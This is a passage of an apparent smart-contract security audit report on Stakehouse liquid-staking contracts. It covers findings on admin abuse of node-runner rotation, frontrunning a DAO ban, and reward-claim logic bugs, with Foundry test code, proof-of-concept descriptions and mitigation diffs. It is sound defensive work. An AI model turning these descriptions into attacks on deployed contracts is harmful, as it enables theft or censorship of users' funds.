class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nodeStakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">eoaRepresentative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">registerBLSPublicKeys</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">nodeStakeAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">eoaRepresentative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Simulate a situation where admin, who is the dao at this moment, is compromised.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Although nodeRunner is not malicious,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   the compromised admin can call the rotateNodeRunnerOfSmartWallet function to assign nodeRunner&#39;s smart wallet to a colluded party.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rotateNodeRunnerOfSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountThree</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// nodeRunner is blocked from other interactions with the protocol since it is now banned unfairly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bannedNodeRunners</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for example, nodeRunner is no longer able to call the withdrawETHForKnot function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Not the node runner for the smart wallet &quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-28\" style=\"position:relative;\"><a href=\"#tools-used-28\" aria-label=\"tools used 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-46\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-46\" aria-label=\"recommended mitigation steps 46 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When calling the <code>deployNewLiquidStakingDerivativeNetwork</code> function, instead of explicitly setting the DAO’s address, a configurable governance contract, which can have features like voting and timelock, can be deployed and used as the DAO.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/383\">vince0656 (Stakehouse) disputed</a></strong></p>\n<hr>\n<h2 id=\"m-27-rotatenoderunnerofsmartwallet-is-vulnerable-to-a-frontrun-attack\" style=\"position:relative;\"><a href=\"#m-27-rotatenoderunnerofsmartwallet-is-vulnerable-to-a-frontrun-attack\" aria-label=\"m 27 rotatenoderunnerofsmartwallet is vulnerable to a frontrun attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386\">[M-27] <code>rotateNodeRunnerOfSmartWallet</code> is vulnerable to a frontrun attack</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386\">Franfran</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L369\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L369</a></p>\n<p>As the <code>rotateNodeRunnerOfSmartWallet</code> function can be called by anyone who is a node runner in the LSD network, this function is vulnerable to a frontrun attack in the case of this node runner being malicious.</p>\n<h4 id=\"proof-of-concept-42\" style=\"position:relative;\"><a href=\"#proof-of-concept-42\" aria-label=\"proof of concept 42 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>If that is the current node runner is malicious, the DAO would purposely call this same <code>rotateNodeRunnerOfSmartWallet</code> with the <code>_wasPreviousNodeRunnerMalicious</code> flag turned on.<br>\nAn actual node runner that has been malicious could monitor the mempool and frontrun the DAO transaction that wanted to slash it and submit the transaction before the DAO to avoid getting banned and rotate their EOA representation of the node.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bannedNodeRunners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>When the DAO transaction would go through, it would revert when it’s checking if the current (old) node representative is still a wallet, but it’s not because the mapping value has been deleted before.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Wallet does not exist&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-47\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-47\" aria-label=\"recommended mitigation steps 47 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Restrict this function to DAO only with the <code>onlyDAO</code> modifier.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// - function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+ </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rotateNodeRunnerOfSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_current</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_new</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">_current</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;New is zero or current&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Wallet does not exist&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_current</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not current owner or DAO&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRunnerCurrentWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_new</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newRunnerCurrentWallet</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;New runner has a wallet&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_new</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nodeRunnerOfSmartWallet</span><span class=\"mtk1\">[</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// - if (msg.sender == dao &amp;&amp; _wasPreviousNodeRunnerMalicious) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bannedNodeRunners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerOfSmartWalletRotated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_current</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-28-funds-are-not-claimed-from-syndicate-for-valid-bls-keys-of-first-key-is-invalid-no-longer-part-of-syndicate\" style=\"position:relative;\"><a href=\"#m-28-funds-are-not-claimed-from-syndicate-for-valid-bls-keys-of-first-key-is-invalid-no-longer-part-of-syndicate\" aria-label=\"m 28 funds are not claimed from syndicate for valid bls keys of first key is invalid no longer part of syndicate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408\">[M-28] Funds are not claimed from syndicate for valid BLS keys of first key is invalid (no longer part of syndicate).</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408\">Trust</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L218\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L218</a></p>\n<p>claimRewards in StakingFundsVault.sol has this code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (i == 0 &amp;&amp; !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _claimFundsFromSyndicateForDistribution(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        liquidStakingNetworkManager.syndicate(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _blsPubKeys</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Distribute ETH per LP</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    updateAccumulatedETHPerLP();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The issue is that if the first BLS public key is not part of the syndicate, then _claimFundsFromSyndicateForDistribution will not be called, even on BLS keys that are eligible for syndicate rewards. This leads to reduced rewards for user.</p>\n<p>This is different from a second bug which discusses the possibility of using a stale acculmulatedETHPerLP.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Users will not receive rewards for claims of valid public keys if first passed key is not part of syndicate.</p>\n<h3 id=\"recommended-mitigation-steps-48\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-48\" aria-label=\"recommended mitigation steps 48 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Drop the <code>i==0</code> requirement, which was intended to make sure the claim isn’t called multiple times. Use a hasClaimed boolean instead.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408#event-8238936350\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-29-user-receives-less-rewards-than-they-are-eligible-for-if-first-passed-bls-key-is-inactive\" style=\"position:relative;\"><a href=\"#m-29-user-receives-less-rewards-than-they-are-eligible-for-if-first-passed-bls-key-is-inactive\" aria-label=\"m 29 user receives less rewards than they are eligible for if first passed bls key is inactive permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410\">[M-29] User receives less rewards than they are eligible for if first passed BLS key is inactive</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410\">Trust</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L224\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L224</a></p>\n<p>StakingFundsVault has the claimRewards() function to allow users to withdraw profits.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function claimRewards(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _recipient,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes[] 